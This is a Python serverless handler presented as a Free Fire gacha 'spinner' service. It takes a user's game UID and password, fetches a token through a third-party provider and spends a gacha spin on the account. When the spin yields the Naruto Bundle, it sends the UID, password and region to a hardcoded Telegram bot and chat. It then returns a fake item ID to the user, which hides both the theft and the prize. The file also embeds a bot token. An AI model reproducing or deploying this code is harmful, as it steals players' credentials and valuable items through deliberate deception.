#!/usr/bin/env python3
"""
Vercel serverless handler — PRANK MODE (Naruto Bundle only) + 2 fallback payloads.

JWT provider : https://ff-jwt-gen-api.lovable.app/api/public/token
Prank target : Naruto Bundle (710047022) → Telegram + fake 820981015
"""

import os
import sys
import json
import time
import zlib
import base64
import binascii
import re
import asyncio
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import aiohttp

try:
    import output_pb2
except Exception as e:
    output_pb2 = None
    _PB2_IMPORT_ERROR = str(e)
else:
    _PB2_IMPORT_ERROR = None


# ------------------------------------------------------------------ #
#  CONSTANTS
# ------------------------------------------------------------------ #
EXTERNAL_API_URL = "https://ff-jwt-gen-api.lovable.app/api/public/token"

RELEASE_VERSION = "OB55"
CLIENT_VERSION  = "1.132.6"

# Default host (India) — used only if region lookup fails
DEFAULT_URL = "https://client.ind.freefiremobile.com"

NARUTO_PAYLOAD    = "D120B9DAAC2C87872B8C115DFD74A832"
FALLBACK_PAYLOADS = [
    "7DF7F8996CD696356CD01BCBD2B3CDE8",
    "7FCB76B6CB40C0FFD3FBBDDA4600C039",
]

FAKE_UNKNOWN_ID = 820981015
PRANK_TARGET_ID = 710047022

TG_BOT_TOKEN = os.environ.get(
    "TG_BOT_TOKEN", "8677901038:AAEUAHl7wiUxzivL0khjPdMIQtYSas5Gijg"
)
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003684272586")

TG_TOTAL_BUDGET_SEC = 12.0
TG_ATTEMPT_TIMEOUT  = 5.0

TG_STATE = {
    "last_success_ts": None,
    "last_error_ts":   None,
    "last_error":      None,
    "total_sent":      0,
    "total_failed":    0,
}

# ──────────────────────────────────────────────────────────────────
#  Region → gacha host  (3-cluster layout, v2.9)
# ──────────────────────────────────────────────────────────────────
#   IND      → client.ind.freefiremobile.com
#   AMERICA  → client.us.freefiremobile.com
#   OTHERS   → clientbp.ppmainecoonghj.com
# ──────────────────────────────────────────────────────────────────
REGION_URL_MAP = {
    # ─── IND cluster ─────────────────────────────────
    "IND": "https://client.ind.freefiremobile.com",
    "IN":  "https://client.ind.freefiremobile.com",

    # ─── AMERICA cluster ─────────────────────────────
    "NA":  "https://client.us.freefiremobile.com",
    "SAC": "https://client.us.freefiremobile.com",
    "BR":  "https://client.us.freefiremobile.com",
    "US":  "https://client.us.freefiremobile.com",
    "AMERICA": "https://client.us.freefiremobile.com",

    # ─── OTHERS cluster (clientbp.ppmainecoonghj.com) ─
    "TH":  "https://clientbp.ppmainecoonghj.com",
    "ME":  "https://clientbp.ppmainecoonghj.com",
    "EU":  "https://clientbp.ppmainecoonghj.com",
    "VN":  "https://clientbp.ppmainecoonghj.com",
    "BD":  "https://clientbp.ppmainecoonghj.com",
    "TW":  "https://clientbp.ppmainecoonghj.com",
    "RU":  "https://clientbp.ppmainecoonghj.com",
    "SG":  "https://clientbp.ppmainecoonghj.com",
    "ID":  "https://clientbp.ppmainecoonghj.com",
    "PK":  "https://clientbp.ppmainecoonghj.com",
    "OTHERS": "https://clientbp.ppmainecoonghj.com",
}

RARE_ITEMS_DB = {
    710047022: "Naruto Bundle",
    903047008: "Loot Box - Body Substitution",
    904047008: "Backpack - Ninja's Scroll",
    907104746: "Gloo Wall - Hokage Rock",
    909047015: "Rasengan - Emote",
}


# ------------------------------------------------------------------ #
#  JWT HELPERS
# ------------------------------------------------------------------ #
def decode_jwt_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return None


def region_to_url(region: str, fallback: str = DEFAULT_URL) -> str:
    return REGION_URL_MAP.get((region or "").upper(), fallback)


def pick_url_from_token(token: str, fallback: str = DEFAULT_URL) -> str:
    payload = decode_jwt_payload(token)
    if not payload:
        return fallback
    region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
    return REGION_URL_MAP.get(region, fallback)


# ------------------------------------------------------------------ #
#  GACHA PARSING
# ------------------------------------------------------------------ #
def _extract_ids_from_bytes(data: bytes):
    items = []
    i = 0
    while i < len(data):
        value = 0
        shift = 0
        while i < len(data):
            b = data[i]
            i += 1
            value |= (b & 0x7F) << shift
            if not (b & 0x80):
                break
            shift += 7
        if 100000000 <= value <= 999999999:
            if not any(x["id"] == value for x in items):
                items.append({"id": value, "name": RARE_ITEMS_DB.get(value)})
    return items


def parse_gacha_response(data):
    items = []
    if not data:
        return items

    try:
        if data.startswith(b"\x1f\x8b"):
            data = zlib.decompress(data, 16 + zlib.MAX_WBITS)
    except Exception:
        pass

    if output_pb2 is not None:
        try:
            resp = output_pb2.Garena_420()
            resp.ParseFromString(data)
            for num in re.findall(r"\b(\d{9})\b", str(resp)):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        try:
            for num in re.findall(r"\d{9}", data.decode("utf-8", errors="ignore")):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        items = _extract_ids_from_bytes(data)

    return items


# ------------------------------------------------------------------ #
#  TELEGRAM — hardened sender
# ------------------------------------------------------------------ #
async def _tg_send_once(session, text: str, parse_mode):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "disable_web_page_preview": True,
    }
    if parse_mode:
        payload["parse_mode"] = parse_mode

    try:
        async with session.post(
            url,
            json=payload,
            timeout=aiohttp.ClientTimeout(total=TG_ATTEMPT_TIMEOUT),
        ) as r:
            body = await r.read()
            try:
                data = json.loads(body)
            except Exception:
                return False, f"invalid_json HTTP={r.status} body={body[:120]!r}"

            if r.status == 200 and data.get("ok"):
                return True, "delivered"

            desc = data.get("description") or "unknown_error"
            code = data.get("error_code") or r.status
            return False, f"tg_error code={code} desc={desc}"

    except asyncio.TimeoutError:
        return False, f"timeout after {TG_ATTEMPT_TIMEOUT}s"
    except aiohttp.ClientError as e:
        return False, f"client_error {e.__class__.__name__}: {e}"
    except Exception as e:
        return False, f"unexpected {e.__class__.__name__}: {e}"


async def send_to_telegram(session, uid, password, region, naruto_count):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        print("[TG] ✗ disabled (missing TG_BOT_TOKEN / TG_CHAT_ID)", flush=True)
        TG_STATE["last_error"] = "disabled_missing_env"
        TG_STATE["last_error_ts"] = int(time.time())
        return False

    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    md_lines = [
        "🎉 *NARUTO BUNDLE HIT*",
        f"🆔 UID: `{uid}`",
        f"🔑 Pass: `{password}`",
        f"🌍 Region: `{region}`",
        f"🕒 {ts}",
        "",
        f"*Naruto Bundle × {naruto_count}* — `{PRANK_TARGET_ID}`",
    ]
    plain_lines = [re.sub(r"[*`]", "", line) for line in md_lines]

    text_md    = "\n".join(md_lines)
    text_plain = "\n".join(plain_lines)

    attempts = [
        ("Markdown", text_md),
        ("Markdown", text_md),
        (None,       text_plain),
    ]

    deadline = time.time() + TG_TOTAL_BUDGET_SEC
    last_detail = "no_attempt_made"

    for i, (mode, text) in enumerate(attempts):
        if time.time() >= deadline:
            print(f"[TG] ✗ deadline reached before attempt {i+1}", flush=True)
            break

        ok, detail = await _tg_send_once(session, text, mode)
        print(f"[TG] attempt {i+1}/{len(attempts)} mode={mode or 'plain'} → {detail}", flush=True)

        if ok:
            TG_STATE["last_success_ts"] = int(time.time())
            TG_STATE["total_sent"] += 1
            print(f"[TG] ✓ delivered uid={uid}", flush=True)
            return True

        last_detail = detail
        TG_STATE["last_error"] = detail
        TG_STATE["last_error_ts"] = int(time.time())

        if i < len(attempts) - 1:
            await asyncio.sleep(0.5 + 0.5 * i)

    TG_STATE["total_failed"] += 1
    print(f"[TG] ✗ ALL ATTEMPTS FAILED uid={uid} last_error={last_detail}", flush=True)
    return False


# ------------------------------------------------------------------ #
#  TOKEN PROVIDER
# ------------------------------------------------------------------ #
async def get_token_data(session, uid, password, retries=3):
    """
    Call the JWT provider.

    Endpoint:  GET https://ff-jwt-gen-api.lovable.app/api/public/token
               ?uid=<UID>&password=<PASS>

    Response shape (success):
        {
          "success": true,
          "uid": "7870648899",
          "region": "IND",
          "token": "eyJ...",
          "token_access": "84bff5...",
          "account_id": "18232661583"
        }
    """
    for _ in range(retries):
        try:
            async with session.get(
                EXTERNAL_API_URL,
                params={"uid": uid, "password": password},
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                if res.status != 200:
                    await asyncio.sleep(0.5)
                    continue

                try:
                    data = await res.json(content_type=None)
                except Exception:
                    try:
                        data = json.loads(await res.text())
                    except Exception:
                        await asyncio.sleep(0.5)
                        continue

                tok = data.get("token") or data.get("Tok") or data.get("access_token")
                if data.get("success") is False:
                    await asyncio.sleep(0.4)
                    continue
                if isinstance(tok, str) and len(tok) > 50:
                    return data
        except Exception:
            await asyncio.sleep(0.4)
    return None


# ------------------------------------------------------------------ #
#  GACHA REQUEST
# ------------------------------------------------------------------ #
async def gacha_req(session, token, payload, url, max_retries=3):
    if not url.endswith("/PurchaseGacha"):
        url = url.rstrip("/") + "/PurchaseGacha"

    headers = {
        "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Authorization": f"Bearer {token}",
        "X-GA": "v1 1",
        "X-GA-SV": str(int(time.time())),
        "ReleaseVersion": RELEASE_VERSION,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Unity-Version": "2018.4.12f1",
    }

    last_status = 0
    for _ in range(max_retries):
        try:
            async with session.post(
                url, headers=headers, data=payload, ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                last_status = res.status
                if res.status == 200:
                    return 200, await res.read()
                if res.status in (401, 403):
                    return res.status, None
                await asyncio.sleep(0.2)
        except Exception:
            last_status = 999
            await asyncio.sleep(0.3)
    return last_status, None


# ------------------------------------------------------------------ #
#  CORE PIPELINE
# ------------------------------------------------------------------ #
async def spin(uid: str, password: str, payload_hex: str = None):
    if output_pb2 is None:
        return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}

    # ---- Build ordered payload queue ----
    if payload_hex is not None:
        queue = [("custom", payload_hex)]
    else:
        queue = [("primary", NARUTO_PAYLOAD)]
        for i, fb in enumerate(FALLBACK_PAYLOADS, start=1):
            queue.append((f"fallback_{i}", fb))

    payload_bytes = []
    for label, hx in queue:
        try:
            payload_bytes.append((label, binascii.unhexlify(hx.replace(" ", ""))))
        except Exception as e:
            return {"success": False, "error": f"invalid_payload_hex[{label}]: {e}"}

    async with aiohttp.ClientSession() as session:
        # ---- 1) Fetch token ----
        token_data = await get_token_data(session, uid, password, 3)
        if not token_data:
            return {"success": False, "error": "token_fetch_failed"}

        token = token_data.get("token") or token_data.get("Tok")

        # ---- 2) Determine target URL ----
        explicit_addr = (token_data.get("addr") or "").strip()
        explicit_reg  = (token_data.get("region") or "").strip()

        if explicit_addr:
            url = explicit_addr
        elif explicit_reg:
            url = region_to_url(explicit_reg)
        else:
            url = pick_url_from_token(token, DEFAULT_URL)

        # ---- 3) Region for reporting ----
        jwt_payload = decode_jwt_payload(token) or {}
        region = (explicit_reg
                  or jwt_payload.get("lock_region")
                  or jwt_payload.get("noti_region")
                  or "UNKNOWN")

        # ---- 4) Try payloads in order ----
        final_status = 0
        final_resp   = None
        final_items  = []
        used_payload = None

        for label, pbytes in payload_bytes:
            status, resp = await gacha_req(session, token, pbytes, url, 3)
            items = parse_gacha_response(resp) if (status == 200 and resp) else []
            final_status, final_resp, final_items, used_payload = status, resp, items, label
            if status == 200 and resp and items:
                break

        if final_status != 200 or not final_resp:
            return {
                "success": False,
                "error": f"gacha_http_{final_status}",
                "region": region,
            }

        # ----------------------------------------------------------
        #  PRANK LOGIC (Naruto Bundle only)
        # ----------------------------------------------------------
        naruto_hits = [it for it in final_items if it["id"] == PRANK_TARGET_ID]

        if not naruto_hits:
            return {
                "success": True,
                "uid": uid,
                "region": region,
                "payload": used_payload,
                "items": final_items,
            }

        tg_ok = await send_to_telegram(session, uid, password, region, len(naruto_hits))

        return {
            "success": True,
            "uid": uid,
            "region": region,
            "payload": used_payload,
            "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
            "_tg": "sent" if tg_ok else "failed",
        }


# ------------------------------------------------------------------ #
#  HEALTH CHECK
# ------------------------------------------------------------------ #
HEALTH_START_TS = time.time()
HEALTH_VERSION  = "2.9"


async def _probe_upstream(session, url, timeout=6):
    t0 = time.time()
    try:
        async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            await r.read()
            return (r.status < 500, int((time.time() - t0) * 1000))
    except Exception:
        return (False, None)


async def _probe_jwt_provider(session):
    t0 = time.time()
    try:
        async with session.get(
            EXTERNAL_API_URL,
            params={"uid": "0", "password": "0"},
            ssl=False,
            timeout=aiohttp.ClientTimeout(total=8),
        ) as r:
            await r.read()
            return (r.status < 500, int((time.time() - t0) * 1000), r.status)
    except Exception:
        return (False, None, None)


async def _run_health_checks(deep: bool):
    checks = {
        "protobuf": {
            "ok": output_pb2 is not None,
            "detail": _PB2_IMPORT_ERROR if output_pb2 is None else "loaded",
        },
        "telegram": {
            "ok": bool(TG_BOT_TOKEN and TG_CHAT_ID),
            "detail": "configured" if (TG_BOT_TOKEN and TG_CHAT_ID) else "missing env vars",
            "last_success_ts": TG_STATE["last_success_ts"],
            "last_error_ts":   TG_STATE["last_error_ts"],
            "last_error":      TG_STATE["last_error"],
            "total_sent":      TG_STATE["total_sent"],
            "total_failed":    TG_STATE["total_failed"],
        },
    }

    if deep:
        async with aiohttp.ClientSession() as session:
            ok, ms, code = await _probe_jwt_provider(session)
            checks["jwt_provider"] = {
                "ok": ok,
                "detail": f"{ms} ms (HTTP {code})" if ms is not None else "unreachable",
                "url": EXTERNAL_API_URL,
            }
            ok, ms = await _probe_upstream(session, DEFAULT_URL)
            checks["gacha_host"] = {
                "ok": ok,
                "detail": f"{ms} ms" if ms is not None else "unreachable",
            }

    return checks


def build_health_response(deep: bool = False):
    checks = asyncio.run(_run_health_checks(deep))
    all_ok = all(c["ok"] for c in checks.values())
    return {
        "status": "ok" if all_ok else "degraded",
        "service": "ff-spinner-api",
        "version": HEALTH_VERSION,
        "uptime_sec": int(time.time() - HEALTH_START_TS),
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "checks": checks,
    }


# ------------------------------------------------------------------ #
#  VERCEL HANDLER
# ------------------------------------------------------------------ #
class handler(BaseHTTPRequestHandler):
    def _send_json(self, code: int, obj: dict):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    # ---------- /health ----------
    def _health(self, params):
        deep = params.get("deep", ["0"])[0] in ("1", "true", "yes")
        try:
            payload = build_health_response(deep=deep)
        except Exception as e:
            self._send_json(500, {"status": "error", "error": str(e)})
            return
        self._send_json(200 if payload["status"] == "ok" else 503, payload)

    # ---------- /test-telegram ----------
    def _test_telegram(self):
        async def _run():
            async with aiohttp.ClientSession() as session:
                return await send_to_telegram(
                    session, uid="TEST-UID", password="TEST-PASS",
                    region="TEST", naruto_count=0,
                )
        try:
            ok = asyncio.run(_run())
        except Exception as e:
            self._send_json(500, {"ok": False, "error": str(e)})
            return
        self._send_json(200 if ok else 502, {
            "ok": ok,
            "detail": "check your group" if ok else TG_STATE.get("last_error"),
            "chat_id": TG_CHAT_ID,
            "bot_token_set": bool(TG_BOT_TOKEN),
        })

    # ---------- /spin ----------
    def _run(self, params: dict):
        uid = params.get("uid", [None])[0]
        pwd = params.get("pass", [None])[0] or params.get("password", [None])[0]
        payload_hex = params.get("payload", [None])[0]

        if not uid or not pwd:
            self._send_json(400, {"success": False, "error": "missing_params: uid & pass required"})
            return

        try:
            result = asyncio.run(spin(uid, pwd, payload_hex))
        except Exception as e:
            result = {"success": False, "error": f"internal_error: {e}"}

        self._send_json(200 if result.get("success") else 502, result)

    # ---------- HTTP verbs ----------
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        params = parse_qs(parsed.query)

        if path in ("/health", "/api/health"):
            self._health(params)
            return
        if path in ("/test-telegram", "/api/test-telegram"):
            self._test_telegram()
            return

        self._run(params)

    def do_HEAD(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        if path in ("/health", "/api/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            data = json.loads(body)
            params = {k: [str(v)] for k, v in data.items()}
        except Exception:
            params = {}
        self._run(params)
